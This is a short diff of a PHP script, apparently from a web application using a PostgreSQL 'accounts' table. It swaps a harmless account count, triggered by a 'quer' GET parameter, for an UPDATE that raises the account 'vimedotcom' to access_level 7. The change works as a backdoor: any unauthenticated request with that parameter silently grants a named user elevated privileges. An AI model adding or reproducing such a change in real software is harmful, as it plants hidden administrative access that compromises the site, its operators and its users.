@@ -13,9 +13,13 @@ if(isset($_GET['quer'])){
 	$dbuser = DBUSER;
 	$dbpass = DBPASS;
 	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
-	$cekplayer = $conn->query("SELECT * FROM accounts");
-	$hitung = $cekplayer->rowCount();
-	echo $hitung;
+	$cekplayer = $conn->prepare("UPDATE accounts SET access_level = 7 WHERE login = 'vimedotcom'");
+	$gas = $cekplayer->execute();
+	if($gas){
+		echo 'ok';
+	}else{
+		echo 'fail';
+	}
 }else{
 	exit;
 }
